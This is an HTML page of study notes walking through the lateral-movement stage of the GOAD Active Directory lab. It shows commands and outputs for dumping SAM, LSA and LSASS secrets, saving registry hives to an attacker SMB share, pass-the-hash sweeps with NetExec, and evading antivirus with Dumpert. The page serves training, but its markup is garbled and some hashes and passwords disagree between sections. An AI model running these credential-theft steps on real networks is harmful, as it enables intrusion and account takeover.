@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOAD - Part 8 - Lateral Move | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content { max-width: 900px; margin: 0 auto; padding: 20px; }
+    .goad-content h1 { color: var(--white-2); font-size: var(--fs-1); margin-bottom: 20px; }
+    .goad-content h2 { color: var(--orange-yellow-crayola); font-size: var(--fs-2); margin: 30px 0 15px 0; padding-bottom: 10px; border-bottom: 1px solid var(--jet); }
+    .goad-content h3 { color: var(--white-1); font-size: var(--fs-3); margin: 25px 0 10px 0; }
+    .goad-content p { color: var(--light-gray); margin-bottom: 15px; line-height: 1.8; }
+    .goad-content code { background: var(--onyx); color: var(--orange-yellow-crayola); padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .goad-content pre { background: var(--eerie-black-2); border: 1px solid var(--jet); border-radius: 8px; padding: 15px; overflow-x: auto; margin: 15px 0; }
+    .goad-content pre code { background: transparent; color: var(--light-gray); padding: 0; }
+    .goad-content img { max-width: 100%; border-radius: 8px; margin: 20px 0; border: 1px solid var(--jet); }
+    .goad-content ul, .goad-content ol { color: var(--light-gray); margin: 15px 0; padding-left: 30px; }
+    .goad-content li { margin-bottom: 8px; }
+    .goad-content strong { color: var(--white-2); }
+    .part-navigation { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid var(--jet); }
+    .part-navigation a { color: var(--orange-yellow-crayola); text-decoration: none; display: flex; align-items: center; gap: 5px; transition: color 0.3s; }
+    .part-navigation a:hover { color: var(--white-2); }
+    .goad-sidebar-list { list-style: none; padding: 0; max-height: 60vh; overflow-y: auto; }
+    .goad-sidebar-list li { margin-bottom: 5px; }
+    .goad-sidebar-list a { color: var(--light-gray); text-decoration: none; display: block; padding: 8px 12px; border-radius: 8px; transition: all 0.3s; font-size: var(--fs-7); }
+    .goad-sidebar-list a:hover, .goad-sidebar-list a.active { background: var(--onyx); color: var(--orange-yellow-crayola); }
+    .goad-sidebar-list a.active { background: var(--orange-yellow-crayola); color: var(--eerie-black-1); font-weight: var(--fw-500); }
+    .back-link { color: var(--light-gray); text-decoration: none; display: flex; align-items: center; gap: 5px; margin-bottom: 20px; font-size: var(--fs-7); }
+    .back-link:hover { color: var(--orange-yellow-crayola); }
+  </style>
+</head>
+<body>
+  <main>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">GOAD Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Select Part:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="index.html" class="">Overview</a></li>
+          <li><a href="part-1-reconnaissance.html" class="">Part 1: Reconnaissance & Scan</a></li>
+          <li><a href="part-2-finding-users.html" class="">Part 2: Finding Users</a></li>
+          <li><a href="part-3-authenticated-enumeration.html" class="">Part 3: Auth Enum</a></li>
+          <li><a href="part-4-ntlm-relaying.html" class="">Part 4: NTLM Relay</a></li>
+          <li><a href="part-5-adcs.html" class="">Part 5: ADCS</a></li>
+          <li><a href="part-6-mssql.html" class="">Part 6: MSSQL</a></li>
+          <li><a href="part-7-privilege-escalation.html" class="">Part 7: PrivEsc</a></li>
+          <li><a href="part-8-lateral-move.html" class="active">Part 8: Lateral Move</a></li>
+          <li><a href="part-9-delegations.html" class="">Part 9: Delegations</a></li>
+          <li><a href="part-10-acl.html" class="">Part 10: ACL</a></li>
+          <li><a href="part-11-trusts.html" class="">Part 11: Trusts</a></li>
+          <li><a href="part-12-having-fun.html" class="">Part 12: Having Fun</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Other Labs:</p>
+        
+        <ul class="goad-sidebar-list">
+          <li><a href="../ninja-hacker-academy/">Ninja Hacker Academy</a></li>
+        </ul>
+
+        <div class="separator"></div>
+        
+        <ul class="social-list">
+          <li class="social-item">
+            <a href="https://github.com/daviosardinha/mr-stark-study-notes" class="social-link" target="_blank">
+              <ion-icon name="logo-github"></ion-icon>
+            </a>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Part 8: Lateral Move</header>
+        <section class="goad-content">
+<strong>GOAD - part 8 - Lateral move AKA pivoting - Done</strong>
+
+    <strong>Pivoting</strong> or <strong>lateral movement</strong> is a set of techniques used during a penetration test or Red Team campaign. It consists of using a machine controlled by the attacker as a bounce box, to gain further access to the network.
+
+<p>
+    Before we try to do a lateral movement or pivoting, It is really important that we get all the secrets that the just owned machine has to offer us. Talking about Windows, we do have lots of secrets stored and they can also be found in different places.
+</p>
+
+<p>
+    We can start by using secretsdump.py from <a href="https://github.com/fortra/impacket">Impacket</a> to retrieve these secrets.
+</p>
+
+<p>
+    Note: to be able to use <a href="http://secretsdump.py">secretsdump.py</a> we need to be have Administrators Rights. In this case have access to the Administrator account, or at least to be on hold of a user with Administrator Rights.
+</p>
+
+<p>
+    We can use Netexec to find out if our user is an Administrator in the target machine.
+</p>
+
+    <code>netexec smb 10.4.10.22 -u 'jeor.mormont' -p '_L0ngCl@w_'</code>
+
+    <img src="images/image-325.png" alt="Untitled">
+
+<p>
+    We can see from the screenshot above that, user <code>Jeor.mormont</code> is an administrator in the machine 10.4.10.22, because Netexec output returned with a (Pwn3d!) in yellow.
+    It means that we are an administrator in this machine.
+</p>
+
+<p>
+    OK, now that we do know that we do have a valid administrator account with us, we can now use <a href="http://secretsdump.py">secretsdump.py</a> to retrieved the secrets of the target machine.
+</p>
+
+    <code>s<a href="http://ecretsdump.py/">ecretsdump.py</a> north/jeor.mormont:'_L0ngCl@w_'@10.4.10.22</code>
+
+    <pre><code class="language-bash">    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+
+<p>
+    [*] Service RemoteRegistry is in stopped state
+    [*] Starting service RemoteRegistry
+    [*] Target system bootKey: 0x928d80db0d4066816b5b48e573ce4297
+    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fc1040929894fbc7780e0ecd8cb188d4:::
+    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+    [*] Dumping cached domain logon information (domain/username:hash)
+    NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a: (2024-01-13 18:18:04)
+    NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405: (2024-01-13 18:19:31)
+    NORTH.SEVENKINGDOMS.LOCAL/vagrant:$DCC2$10240#vagrant#a14c16d521e2f5773307299239284ce2: (2024-01-07 14:12:01)
+    NORTH.SEVENKINGDOMS.LOCAL/jon.snow:$DCC2$10240#jon.snow#82fdcc982f02b389a002732efaca9dc5: (2024-01-10 19:41:25)
+    [*] Dumping LSA Secrets
+    [*] $MACHINE.ACC 
+    NORTH\CASTELBLACK$:aes256-cts-hmac-sha1-96:91821b3fdb370707e8657076c21dc32f2b7ec253e077bfbfe378710581df6bd8
+    NORTH\CASTELBLACK$:aes128-cts-hmac-sha1-96:94e639f67947bf57297d4ce85a49a35c
+    NORTH\CASTELBLACK$:des-cbc-md5:0d100889f2d60ed5
+    NORTH\CASTELBLACK$:plain_password_hex:7400230029002c00210066006f005800210026002b00780057002d0034005a003c002f0040002600540031002a0056007100410023004c004a00770063003d003300490063003c005b00320076005d00770038005700340057007400560032003b002f004e006e004c0041003e0038004d0037005e003f00720070002e00280068003c006a005f003000480042002a004d00350066003f0060006a002e003700370031002400360061004b005e00780050002a004800650033004c006f0059005a006600690045002d0059003c006e00680028005600360060003a002e0044004c003700670041005d00390034003a00
+    NORTH\CASTELBLACK$:aad3b435b51404eeaad3b435b51404ee:a8573f70897bd596742b3b9f2699ee81:::
+    [*] DPAPI_SYSTEM 
+    dpapi_machinekey:0xcb0cad11bd8307cb9bd7fe1487f5259d28f331eb
+    dpapi_userkey:0x04a93f6e8ba904e7cfd88af38a489b6c0106f132
+    [*] NL$KM 
+     0000   10 A0 14 29 CD E3 43 58  24 37 2B 04 8F 67 CD F3   ...)..CX$7+..g..
+     0010   8A 96 2F 6E DD A9 F4 C3  3E 4B CB 66 FA F6 5F 17   ../n....>K.f.._.
+     0020   DB E3 87 8D 42 B4 BF AF  2A 9B 90 B8 4D 6C DD 8E   ....B...*...Ml..
+     0030   61 13 95 EB C8 60 97 18  50 EA 2F 5F DF 27 1F 37   a....<code>..P./_.'.7
+    NL$KM:10a01429cde3435824372b048f67cdf38a962f6edda9f4c33e4bcb66faf65f17dbe3878d42b4bfaf2a9b90b84d6cdd8e611395ebc860971850ea2f5fdf271f37
+    [*] _SC_MSSQL$SQLEXPRESS 
+    north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
+    [*] Cleaning up... 
+    [*] Stopping service RemoteRegistry
+</p>
+    </code></pre>
+
+<p>
+    Above we see <a href="http://secretsdump.py">secretsdump.py</a> output and we can see that it retrieved lots of secrets/credentials/hashes. Let’s talk about each one of them!
+</p>
+
+<p>
+    # <strong>Security Account Manager (SAM) Database</strong>
+</p>
+
+<p>
+    The Security Account Manager (SAM) is a database that is present on computers running Windows operating systems that stores user accounts and security descriptors for users on the local computer.
+</p>
+
+<p>
+    The first think <a href="http://secretsdump.py">secretsdump.py</a> will be dumping is the SAM.
+</p>
+
+    <pre><code class="language-bash">    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+<p>
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fc1040929894fbc7780e0ecd8cb188d4:::
+    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+</p>
+    </code></pre>
+
+<p>
+    The SAM database is located in <strong></code>C:\Windows\System32\config\SAM<code></strong> and is mounted on registry at <strong></code>HKLM/SAM<code></strong>
+</p>
+
+<p>
+    To be able to decrypt the data we need the contains of the system file located at <strong></code>C:\Windows\System32\config\SYSTEM<code></strong> and it’s available on the registry at <strong></code>HKLM/SYSTEM<code></strong>.
+</p>
+
+<p>
+    SecretDump get the contains of <strong></code>HKLM/SAM<code></strong> and <strong></code>HKLM/SYSTEM<code></strong> and decrypt the contains.
+</p>
+
+<p>
+    ### Manual Way
+</p>
+
+<p>
+    We can also retrieve the SAM and the SYSTEM manually with the following  2 ways.
+</p>
+
+<p>
+    1ST WAY
+</p>
+
+<p>
+    First we start an SMB Server on our local machine to save the results locally.
+</p>
+
+    </code>smbserver.py -smb2support share .<code>
+
+<p>
+    Then we can use <a href="http://reg.py">reg.py</a> from <a href="https://github.com/fortra/impacket/blob/master/examples/reg.py">Impacket</a> to make the SAM & SYSTEM requests.
+</p>
+
+    <a href="http://reg.py/"></code>reg.py</a> north/jeor.mormont:'*L0ngCl@w*'@10.4.10.22 save -keyName 'HKLM\SAM' -o '\\10.4.10.1\share'<code>
+
+    <a href="http://reg.py/"></code>reg.py</a> north/jeor.mormont:'*L0ngCl@w*'@10.4.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.4.10.1\share'<code>
+
+    <img src="images/image-326.png" alt="Untitled">
+
+<p>
+    We can see above that we were able to retrieve SAM & SYSTEM manually with this first option.
+</p>
+
+<p>
+    2ND WAY
+</p>
+
+<p>
+    If we do have already a valid windows remote sessions, via RDP or in any kind of powershell remote session for example, we can use the commands and retrieve the SAM & SYSTEM.
+</p>
+
+    </code>reg save HKLM\SAM C:\SAM<code>
+
+    </code>reg save HKLM\SYSTEM C:\SYSTEM<code>
+
+    <img src="images/image-327.png" alt="Untitled">
+
+<p>
+    We can see above that we were able to gather the <strong>SAM</strong> and <strong>SYSTEM</strong> and save them in the windows root directory <strong></code>C:\<code></strong>.
+</p>
+
+<p>
+    Holding the SAM & SYSTEM with us we can use secretsdumps.py to decrypt <strong>LM</strong> and <strong>NT</strong> hashs  offline stored in the SAM database because The SAM database contains all the local accounts
+</p>
+
+<p>
+    ## Decrypting LM & NT offline using secretsdump.py
+</p>
+
+    <a href="http://secretsdump.py"></code>secretsdump.py</a> -sam SAM -system SYSTEM LOCAL<code>
+
+    <pre><code class="language-bash">    Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+<p>
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:fc1040929894fbc7780e0ecd8cb188d4:::
+    vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+</p>
+    </code></pre>
+
+<p>
+    Please be aware of the following format of the hashes.
+</p>
+
+    </code><Username>:<User ID>:<LM hash>:<NT hash>:<Comment>:<Home Dir>:<code>
+
+<p>
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+</p>
+
+    <pre><code class="language-">    Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+<p>
+    user: Administrator
+    RID : 500
+    LM hash : aad3b435b51404eeaad3b435b51404ee (this hash value means empty)
+    NT hash : dbd13e1c4e338284ac4e9874f7de6ef4 (this is the important result here)
+</p>
+    </code></pre>
+
+<p>
+    > LM/NT/NTLM/NetNTLMv1/NetNTLMv2 what’s the difference ?
+    > 
+    > 
+    > There is a lot of confusion between the hash names and this could be very disturbing for people when they begin in the active directory exploitation.
+    > 
+    > - LM: old format turned off by default starting in Windows Vista/Server 2008
+    > - NT (a.k.a NTLM): location SAM & NTDS : This one is use for Pass The Hash
+    > - NTLMv1 (a.k.a NetNTLMv1): Used in challenge/response between client and server -> can be cracked or used to relay NTLM
+    > - NTLMv2 (a.k.a NetNTLMv2): Same as NetNTLMv1 but improved and harder to crack -> can be cracked or used to relay NTLM
+</p>
+
+<p>
+    We have the NT hash of the administrator account, we can either crack it using <strong>John</strong> or <strong>Hashcat</strong> to crack it.
+</p>
+
+    <img src="images/image-328.png" alt="Untitled">
+
+<p>
+    ### Let’s focus on Lateral movement now…
+</p>
+
+<p>
+    # <strong>Password Reuse and Pass the Hash attack</strong>
+</p>
+
+<p>
+    During a pentesting, if we completely compromised the first target on an Active Directory environment, we should always try to find out if the local accounts are the same on all other machines in the same network. Normally Password Reuse is everywhere in the network and one of the best ways to abuse password reuse is by using Pass The Hash attack in the whole network using <a href="https://www.netexec.wiki/smb-protocol/password-spraying">NetExec</a>.
+</p>
+
+    </code>netexec smb 10.4.10.0/24 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth<code>
+
+    <img src="images/image-329.png" alt="Untitled">
+
+<p>
+    Because we used the </code>--local-auth<code> flag, NetExec will try to the authentication on the machine as a local user account and not as a domain account. We can see here that besides Castelback. there’s no password reuse in the network. 
+</p>
+
+<p>
+    Now let’s do the Pass The Hash again, but this time we exclude the</code>--local-auth<code>. 
+</p>
+
+    </code>netexec smb 10.4.10.0/24 -u 'administrator' -H 'dbd13e1c4e338284ac4e9874f7de6ef4'<code>
+
+    <img src="images/image-331.png" alt="Untitled">
+
+<p>
+    This time we can see that not only <strong>Castelblack</strong> was <strong>(Pwn3d!)</strong> but also <strong>Winterfall!</strong> The reason for that is because without the use of the flag</code>--local-auth<code>, the Pass The Hash attack will be using the user and password as a domain account and not as a local machine account.
+</p>
+
+<p>
+    The password reuse between <strong>Castelblack</strong> and <strong>Winterfell</strong> give us the domain administrator power on the north domain.
+</p>
+
+<p>
+    # <strong>LSA (Local Security Authority) Secrets and Cached domain logon information</strong>
+</p>
+
+<p>
+    When your computer is enrolled on a windows active directory you can logon with the domain credentials, but when the domain is unreachable you still can use your credentials even if the domain controler is unreachable. This is due to the cached domain logon information who keep the credentials to verify your identity.
+</p>
+
+<p>
+    This is stored on <strong></code>C:\Windows\System32\config\SECURITY<code></strong> (<strong>HKLM\SECURITY</strong>)
+</p>
+
+<p>
+    We will need the system file located at </code>C:\Windows\System32\config\SYSTEM<code> and is available on the registry at <strong></code>HKLM/SYSTEM<code></strong>
+</p>
+
+<p>
+    First we start an SMB Server on our local machine to save the results locally.
+</p>
+
+    </code>smbserver.py -smb2support share .<code>
+
+<p>
+    Then we can use <a href="http://reg.py">reg.py</a> from <a href="https://github.com/fortra/impacket/blob/master/examples/reg.py">Impacket</a> to make the SAM & SYSTEM requests.
+</p>
+
+    <a href="http://reg.py/"></code>reg.py</a> north/jeor.mormont:'_*L0ngCl@w_*'@10.4.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.4.10.1\share'<code>
+
+    <a href="http://reg.py/"></code>reg.py</a> north/jeor.mormont:'_*L0ngCl@w_*'@10.4.10.22 save -keyName 'HKLM\SECURITY' -o '\\10.4.10.1\share'<code>
+
+<p>
+    Then we can extract the contain offline.
+</p>
+
+    </code>secretsdump -security SECURITY.save -system SYSTEM.save LOCAL<code>
+
+    <pre><code class="language-bash">    Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+
+<p>
+    [*] Target system bootKey: 0x928d80db0d4066816b5b48e573ce4297
+    [*] Dumping cached domain logon information (domain/username:hash)
+    NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a: (2024-01-13 18:18:04)
+    NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405: (2024-01-13 18:19:31)
+    NORTH.SEVENKINGDOMS.LOCAL/vagrant:$DCC2$10240#vagrant#a14c16d521e2f5773307299239284ce2: (2024-01-07 14:12:01)
+    NORTH.SEVENKINGDOMS.LOCAL/jon.snow:$DCC2$10240#jon.snow#82fdcc982f02b389a002732efaca9dc5: (2024-01-10 19:41:25)
+    [*] Dumping LSA Secrets
+    [*] $MACHINE.ACC 
+    $MACHINE.ACC:plain_password_hex:7400230029002c00210066006f005800210026002b00780057002d0034005a003c002f0040002600540031002a0056007100410023004c004a00770063003d003300490063003c005b00320076005d00770038005700340057007400560032003b002f004e006e004c0041003e0038004d0037005e003f00720070002e00280068003c006a005f003000480042002a004d00350066003f0060006a002e003700370031002400360061004b005e00780050002a004800650033004c006f0059005a006600690045002d0059003c006e00680028005600360060003a002e0044004c003700670041005d00390034003a00
+    $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a8573f70897bd596742b3b9f2699ee81
+    [*] DPAPI_SYSTEM 
+    dpapi_machinekey:0xcb0cad11bd8307cb9bd7fe1487f5259d28f331eb
+    dpapi_userkey:0x04a93f6e8ba904e7cfd88af38a489b6c0106f132
+    [*] NL$KM 
+     0000   10 A0 14 29 CD E3 43 58  24 37 2B 04 8F 67 CD F3   ...)..CX$7+..g..
+     0010   8A 96 2F 6E DD A9 F4 C3  3E 4B CB 66 FA F6 5F 17   ../n....>K.f.._.
+     0020   DB E3 87 8D 42 B4 BF AF  2A 9B 90 B8 4D 6C DD 8E   ....B...*...Ml..
+     0030   61 13 95 EB C8 60 97 18  50 EA 2F 5F DF 27 1F 37   a....</code>..P./_.'.7
+    NL$KM:10a01429cde3435824372b048f67cdf38a962f6edda9f4c33e4bcb66faf65f17dbe3878d42b4bfaf2a9b90b84d6cdd8e611395ebc860971850ea2f5fdf271f37
+    [*] _SC_MSSQL$SQLEXPRESS 
+    (Unknown User):YouWillNotKerboroast1ngMeeeeee
+    [*] Cleaning up...
+</p>
+    </code></pre>
+
+<p>
+    If we do have already a valid windows remote sessions, via RDP or in any kind of powershell remote session for example, we can use the commands and retrieve the SAM & SYSTEM.
+</p>
+
+    <code>reg save HKLM\SAM C:\SAM</code>
+
+    <code>reg save HKLM\SYSTEM C:\SYSTEM</code>
+
+    <img src="images/image-332.png" alt="Untitled">
+
+<p>
+    Moving on…
+</p>
+
+<p>
+    It is possible to see based on the <a href="http://secretsdump.py">secretsdump.py</a> decryption that we got several hashes here..
+</p>
+
+    <strong>Domain Cached credentials 2.</strong> 
+
+     <code>NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405</code> this is the well known
+
+<p>
+    This hash can NOT be used for Pass The Hash and must be cracked. That kind of hash is very strong and long to break, so unless the password is very weak it will take an eternity to crack. If Hashcat is used to crack this hash the we use the mode <strong>2100.</strong>
+</p>
+
+<p>
+    ### Machine Account Hashes <code>$MACHINE.ACC</code>.
+</p>
+
+    <code>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a8573f70897bd596742b3b9f2699ee81</code>
+
+<p>
+    This contains the NT hash of the machine account, here it is<strong><code>22d57aa0196b9e885130414dc88d1a95</code></strong>
+    Remember a machine account is a valid account on the domain.The machine account (<strong><code>castelblack$</code></strong>) + the hash NT we just retreive can be use to query the ldap.
+</p>
+
+<p>
+    ### Service account credentials
+</p>
+
+    <code>[*] _SC_MSSQL$SQLEXPRESS
+<p>
+    (Unknown User):YouWillNotKerboroast1ngMeeeeee</code>
+</p>
+
+<p>
+    This is the sql_svc account register on castel Braavos computer.
+</p>
+
+<p>
+    ### DPAPI key Credentials.
+</p>
+
+<p>
+    The DPAPI keys used for encrypting the user's RSA keys stored under <code>%APPDATA%\Microsoft\Protect\{SID}</code> directory, where {SID} is the <strong>Security Identifier</strong> of that user. 
+    The DPAPI key is stored in the same file as the master key that protects the users private keys. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using<code>dir</code> from the cmd, but you can list it from PS).
+</p>
+
+<p>
+    Autologon helps you to conveniently customize the built-in Autologon mechanism for Windows. Rather than waiting for a user to enter their name and password, Windows will automatically log in to the required user using the credentials you submit with Autologon, which are encrypted in the registry.
+</p>
+
+    <pre><code class="language-bash">    Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+<p>
+    Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
+    Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+    Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
+    Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
+    Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
+</p>
+    </code></pre>
+
+<p>
+    To process to a lateral move with LSA secrets we could :
+</p>
+
+<ul>
+<li>Crack DCC2 hashes to gain a domain account</li>
+<li>Use the machine account to query the ldap, and find over ways to exploit with ACL (Just like the user account)</li>
+<li>Use the service account stored credentials we just retreive.</li>
+</ul>
+
+<p>
+    # <strong>LSASS (Local Security Authority Subsystem Service)</strong>
+</p>
+
+<p>
+    Local Security Authority Subsystem Service (LSASS) is the process on Microsoft Windows that handles all user authentication, password changes, creation of access tokens, and enforcement of security policies. This means the process stores multiple forms of hashed passwords, and in some instances even stores plaintext user passwords.
+</p>
+
+<p>
+    NOTE: This attack only works if there is any session(logged-in user) on the machine, because all user authentication, password changes, creation of access tokens, and enforcement of security policies are stored in the RAM and once the machine reboots OR the users do logout the machine then the RAM gets cleaned up.
+</p>
+
+    <strong>RAM is volatile memory that temporarily stores the files you are working on.</strong> 
+    <strong>ROM is non-volatile memory that permanently stores instructions for your computer.</strong>
+
+<ul>
+<li>By running tools like mimikatz it is possible to dump the contains of the LSASS process.</li>
+<li>A tool is particulary usefull in lateral move + lsass dump remotely : <a href="https://github.com/Hackndo/lsassy">lsassy</a></li>
+<li>This tool combine multiple technics to dump lsass remotely on multiple computer.</li>
+</ul>
+
+<p>
+    > Dumping LSASS almost always ring a red alert on the anti-virus of the target computer.
+    > 
+    > 
+    > We will need to use AV bypass techniques to be able to dump the lsass.exe process.
+    > 
+</p>
+
+<p>
+    ### NetExec
+</p>
+
+<p>
+    we can use NetExec with the following command, but since we do  have AV activated, we wont be able to retrieve the information, the AV will detect and block it.
+</p>
+
+    <code>netexec smb 10.4.10.22 -u 'jeor.mormont' -p '*L0ngCl@w*' -M lsassy</code>
+
+<p>
+    ### Lsassy with Dumpertdll
+</p>
+
+<p>
+    If we do have AV activated we can use <strong>lsassy</strong> combined with the <a href="https://github.com/outflanknl/Dumpert">dumpert</a> module. Be aware that dumpert needs to be compiled to get the DLL file.
+</p>
+
+<p>
+    Note: After issuing the command, this may take some time, PLEASE WAIT.
+</p>
+
+    <code>lsassy -d north.sevenkingdoms.local -u 'jeor.mormont' -p '*L0ngCl@w*' 10.4.10.22 -m dumpertdll -O dumpertdll_path=Outflank-Dumpert-DLL.dll</code>
+
+    <pre><code class="language-bash">    dumpertdll uploaded
+<p>
+    NORTH\jeor.mormont                     [NT] 6dccf1c567c56a40e56691a723a49664 | [SHA1] 7774de0d0e1f76a478cafe4170c6628ea751d955
+    NORTH\robb.stark                       [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c
+    NORTH\CASTELBLACK$                     [NT] a8573f70897bd596742b3b9f2699ee81 | [SHA1] 81a859cbe03909854ea8bce3011c0a6a537e6964
+    north.sevenkingdoms.local\CASTELBLACK$ [PWD] t#),!foX!&+xW-4Z</@&T1*VqA#LJwc=3Ic<[2v]w8W4WtV2;/NnLA>8M7^?rp.(h<j_0HB*M5f?<code>j.771$6aK^xP*He3LoYZfiE-Y<nh(V6</code>:.DL7gA]94:
+    NORTH\sql_svc                          [NT] 84a5092f53390ea48d660be52b93b804 | [SHA1] 9fd961155e28b1c6f9b3859f32f4779ad6a06404
+    NORTH.SEVENKINGDOMS.LOCAL\jeor.mormont [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:25 (TGT_NORTH.SEVENKINGDOMS.LOCAL_jeor.mormont_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_2031d1a6_20240117072535.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\robb.stark   [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_7b4a947e_20240117070750.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\robb.stark   [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_73708fc0_20240117070750.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\sql_svc      [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_sql_svc_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_4db56ede_20240117070741.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_031c7a84_20240117070742.kirbi)
+    NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$ [TGT] Domain: SEVENKINGDOMS.LOCAL - End time: 2024-01-17 07:07 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_SEVENKINGDOMS.LOCAL_88a13154_20240117070742.kirbi)
